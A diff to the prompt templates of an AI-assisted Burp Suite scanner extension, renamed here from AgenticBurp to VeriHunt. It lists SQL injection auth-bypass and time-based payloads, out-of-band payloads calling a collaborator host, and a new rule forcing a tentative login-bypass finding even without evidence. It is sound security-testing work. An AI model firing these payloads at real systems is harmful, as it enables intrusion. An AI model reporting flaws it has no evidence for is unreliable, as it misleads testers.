@@ -1,5 +1,5 @@
 # -*- coding: utf-8 -*-
-# AgenticBurp - AI-Powered Security Analysis for Burp Suite
+# VeriHunt - AI-Powered Security Analysis for Burp Suite
 # prompt_handler.py -- Advanced prompt engineering for security analysis
 #
 # System prompt and user prompt templates are adapted from the
@@ -136,6 +136,13 @@ For FOUND and POSSIBLE, provide the full finding block defined in Phase 3.
     Evidence targets: all string/numeric parameters, login fields, search fields, filter params
     Test: ' OR 1=1--, 1 AND SLEEP(5)--, ' UNION SELECT NULL--, error-based payloads
     Blind indicators: time delay, Boolean response difference, error message change
+    MANDATORY for LOGIN / AUTH endpoints (username+password, or any credential params):
+      ALWAYS emit a finding "Potential SQL Injection / Authentication Bypass" at
+      Confidence: Tentative (this tool sends no payloads, so it stays Tentative unless
+      the response already shows a SQL error). Document auth-bypass payloads in BOTH the
+      username AND password fields: ' OR '1'='1'-- -, admin'-- -, ') OR ('1'='1'-- -,
+      " OR "1"="1"-- -, and a time-based check (1 AND SLEEP(5)-- -). Do NOT omit this
+      just because the captured response looks normal -- absence of proof is not disproof.
     OOB: '; EXEC master..xp_dirtree '//COLLABORATOR_URL/a'--  (MSSQL)
          ' AND LOAD_FILE(CONCAT('\\\\',COLLABORATOR_URL,'\\a'))--  (MySQL)
 
@@ -442,6 +449,7 @@ CRITICAL FORMATTING RULES:
 - Your response MUST start directly with the first finding (a `# Vulnerability Name` heading).
 - If nothing is found, output EXACTLY one finding starting with `# No Vulnerabilities Identified`.
 - The ONLY top-level `#` headings allowed are individual vulnerability names.
+- NEVER use a `#` heading for a PoC step, command, or explanation (e.g. "# Decrypt with:", "# Using sslstrip:"). Keep all steps INSIDE the finding body as plain text or fenced ``` code blocks; use `##`/`###` at most for the fixed sub-sections below.
 
 Output ALL findings ordered: Critical > High > Medium > Low > Informational.
 Use EXACTLY this format for every finding:
@@ -527,7 +535,7 @@ class PromptHandler(object):
 
     def build_prompts(self, prompt_template, request_bytes, request_info, response_bytes,
                       max_request_chars=6000, max_response_chars=4000,
-                      collaborator_url=""):
+                      collaborator_url="", memory_context=""):
         """
         Build system_prompt and user_prompt from request/response data.
         Returns (system_prompt, user_prompt).
@@ -596,6 +604,13 @@ class PromptHandler(object):
             }
             _pattern = re.compile("|".join(re.escape(k) for k in _subs))
             user_prompt = _pattern.sub(lambda m: _subs[m.group(0)], prompt_template)
+
+            # Cross-scan memory context (our own trusted text) is prepended so the
+            # model avoids re-reporting dismissed false positives on this host.
+            if memory_context:
+                user_prompt = (
+                    "=== CROSS-SCAN MEMORY FOR THIS HOST ===\n" + memory_context +
+                    "\n=== END MEMORY ===\n\n" + user_prompt)
 
             return SYSTEM_PROMPT, user_prompt
 
